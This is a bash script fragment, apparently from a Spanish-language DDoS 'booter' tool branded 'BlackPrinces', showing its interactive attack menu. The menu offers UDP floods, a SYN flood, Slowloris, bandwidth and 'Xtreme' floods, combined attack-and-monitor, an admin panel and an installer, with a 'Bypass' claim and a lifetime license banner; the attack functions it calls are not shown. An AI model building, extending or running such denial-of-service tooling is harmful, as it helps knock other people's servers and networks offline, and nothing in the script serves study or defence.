Take_input1()
{
clear
while :
do
clear
echo -e "${WHITE}Princes${RED}                                         User:"${LIGHTCYAN}$(whoami)"${RED}Expires:"${LIGHTPURPLE}Lifetime
echo -e "${WHITE}                                                     MENU PRIVADO 6.0 
Bypass [${LIGHTPURPLE}ON${WHITE}]                                "${LIGHTCYAN}Tu Version: "${LIGHTCYAN}v6.0 "${LIGHTCYAN}[Version Privada]
echo -e "${WHITE}
   _ B _ L _ A _ C _ K _                     Projectツ◀♛BlackPrinces♛▶ツ﻿ Private 1.0 ${WHITE}
  / \ / \ / \ / \ / \ / \                       --------------------------------${LIGHTCYAN}
 ( P | R | I | N | C | E )      ${LIGHTCYAN}                 ESTAS CONECTADO A BlackPrinces ${WHITE}
  \_/ \_/ \_/ \_/ \_/ \_/                      ----------------------------------
"${WHITE}
    echo -e "${WHITE}Nota: "${LIGHTCYAN}PARA SALIR DE UN ESCRITURA O DETENER ATAQUES, PULSE [CTRL + C] MATAR TODOS LOS ATAQUES CON 14
    echo -e "${LIGHTRED}[==============================================================================]"
    echo -e "${LIGHTCYAN}[1]${LIGHTRED}UDP Flood${LIGHTCYAN}                                             [5]${LIGHTRED}Bandwidth${LIGHTBLUE}"                                                                                         																									
    echo -e "${LIGHTCYAN}[2]${LIGHTRED}UDP Flood B${LIGHTCYAN}                                           [6]${LIGHTRED}SyN Flood${LIGHTCYAN}"
    echo -e "${LIGHTCYAN}[3]${LIGHTRED}Xtreme FlooD${LIGHTCYAN}                                          [7]${LIGHTCYAN}MULTI UPDATED${LIGHTCYAN}"
    echo -e "${LIGHTCYAN}[4]${LIGHTRED}SLOWLORIS${LIGHTCYAN}                                             [8]${LIGHTRED}PRINCE SCRIPT${LIGHTCYAN}"
    echo -e ""                                                                 
    echo -e "${LIGHTRED}[==============================================================================]"
    echo -e "${PURPLE}                                 ~OPTIONS~                                      "
    echo -e "${LIGHTCYAN}[9]${LIGHTRED}Change Password${LIGHTCYAN}                                       [AI]${LIGHTRED}Installer"
    echo -e "${LIGHTCYAN}[10]${LIGHTRED}Dstat${LIGHTCYAN}                                                [12]${LIGHTRED}Admin Panel"
    echo -e "${LIGHTCYAN}[11]${LIGHTRED}Attack & Dstat${LIGHTCYAN}                                       [13]${LIGHTRED}Exit Menu"
    echo -e ""
    echo -n "#BlackPrinces - Menu [1-13-AI]: "
    read yourch
    case $yourch in
      1) udp_flooda ;;
      2) udp_floodb ;;
      3) slap ;;
	  4) slowloris ;;
	  8) fry ;;
         5) bw ;;
         6) syn ;;
	  14) killall ;;
	  9) passwd ;;
	  7) multi ;;
	  10) dstat1 ;;
	  11) and ;;
	  12) admin12 ;;
	  AI) autoinstall ;;
      ex) echo "Como usted ordene" ;  exit 1  ;;
	  13) pkill menu  ;;
      *) echo "Seleccion invalida, por favor coge otro numero [1-11]" ;
         echo "Presiona Enter. . ." ; read ;;
 esac
done # end_while
}
#
# Set trap to for CTRL+C interrupt i.e. Install our error handler
# When occurs it first it calls del_file() and then exit
#
trap exit_script 2
#
# Call our user define function : Take_input1
#
Take_input1
